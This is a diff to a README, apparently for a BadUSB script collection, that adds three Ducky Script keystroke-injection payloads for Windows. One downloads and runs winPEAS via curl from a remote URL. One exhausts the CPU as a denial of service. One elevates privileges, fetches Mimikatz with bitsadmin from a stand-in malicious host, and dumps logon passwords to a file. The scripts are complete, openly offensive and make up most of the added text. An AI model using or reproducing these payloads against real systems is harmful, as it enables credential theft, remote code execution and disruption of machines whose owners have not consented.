@@ -25,18 +25,15 @@
 - [📍 Overview](#-overview)
 - [⚙️ Features](#️-features)
 - [👾 List of Bad USB scripts](#-list-of-Bad-USB-scripts)
-- 
   - [1️⃣ winPEAS payload delivered by curl ](#️-winPEAS-payload-delivered-by-curl)
-  - [2️⃣ winPEAS payload delivered by curl ](#️-winPEAS-payload-delivered-by-curl)
-  - [3️⃣ winPEAS payload delivered by curl ](#️-winPEAS-payload-delivered-by-curl)
-
+  - [2️⃣ DoS - processor exhaustion ](#️-DoS---processor-exhaustion)
+  - [3️⃣ Mimikatz payload delivered by BITSAdmin](#️-Mimikatz-payload-delivered-by-BITSAdmin)
+  - ### 3️⃣ Mimikatz payload delivered by BITSAdmin
 - [🚀 Getting Started](#-getting-started)
-  
   - [✔️ Prerequisites](#️-prerequisites)
   - [💻 Installation](#-installation)
   - [🎮 Generating payloads](#-Generating-payloads)
   - [⚠️ Warning](#-warning)
-    
 - [🤝 Contributing](#-contributing)
 - [📄 License](#-license)
 - [👏 Acknowledgments](#-acknowledgments)
@@ -53,9 +50,15 @@
 
 ***BadUSB*** is a computer security attack using USB devices that are programmed with malicious software.For example, USB flash drives can contain a programmable Intel 8051 microcontroller, which can be reprogrammed, turning a USB flash drive into a malicious device. This attack works by programming the fake USB flash drive to emulate a keyboard, which once plugged into a computer, is automatically recognized and allowed to interact with the computer, and can then initiate a series of keystrokes which open a command window and issue commands to download malware.
 
+
 ---
 
+
 ## 👾 List of Bad USB scripts
+
+### 1️⃣ winPEAS payload delivered by curl
+
+This script performs the delivery and execution of a potentially malicious file (winPEAS.exe) from a remote location. Its intent, is to open a Command Line on a target Windows system and then fetch via curl and run a payload from a specified URL.
 
 ```sh
 REM Title: Bad USB - winPEAS payload delivered by curl
@@ -85,8 +88,79 @@ ENTER
 DELAY 750
 STRING curl -LJO "%downloadURL%" && move "winPEAS.exe" "%downloadPath%" && start "" "%runCommand%"
 ENTER
-
 ```
+
+### 2️⃣ DoS - processor exhaustion
+
+The technical intent of this script is to cause a denial of service (DoS) condition by exhausting the target system's CPU, making it unresponsive and potentially leading to system instability. This type of attack is disruptive and can cause significant disruption to the target system's operation.
+
+```sh
+REM Title: Bad USB - Processor Exhaustion
+REM Author: DannnyzZ
+REM Date: 10.15.2023
+REM Description: Opens commandline, then executes PC stress test.
+REM Target: Windows 10/11 (cmd)
+REM Version: 1.0
+
+REM Pause for everything to recognize and be ready
+DELAY 2000
+
+REM Open Command Line
+CTRL ESC
+DELAY 750
+STRING cmd
+DELAY 250
+ENTER
+DELAY 1000
+ENTER
+
+REM Input command
+STRING for /l %i in (1,1,1000000) do echo. 2^32 | find /r ".*"
+ENTER
+```
+
+### 3️⃣ Mimikatz payload delivered by BITSAdmin
+
+This script is a malicious payload designed to harvest login credentials from the target system using Mimikatz. The script delivers Mimikatz via BITSAdmin and then runs it to capture login passwords and save them to a file.
+
+```sh
+REM Title: Bad USB - Mimikatz via bitsadmin
+REM Author: DannnyzZ
+REM Date: 10.15.2023
+REM Description: MIMIKATZ drop credentials on desktop
+REM Target: Windows 10/11 (cmd)
+REM Version: 1.0
+
+REM Pause for everything to recognize and be ready
+DELAY 2000
+
+REM Elevate priviledges
+DELAY 750  
+GUI r 
+DELAY 1000
+STRING powershell Start-Process cmd -Verb runAs
+ENTER
+DELAY 750  
+ALT t 
+DELAY 750  
+ENTER
+DELAY 500
+STRING bitsadmin /transfer "mimikatz" /download /priority foreground "https://www.malicious.com/mimikatz.exe" "C:\Users\Public\mimikatz.exe"
+ENTER
+DELAY 3000
+
+REM Execute commands in mimikatz
+STRING start C:\Users\Public\mimikatz.exe
+ENTER
+DELAY 500
+STRING privilege::debug
+ENTER
+DELAY 1000
+STRING sekurlsa::logonpasswords >> C:\Users\Public\dump.txt
+ENTER
+DELAY 1000
+```
+
 
 ## 🚀 Getting Started
 
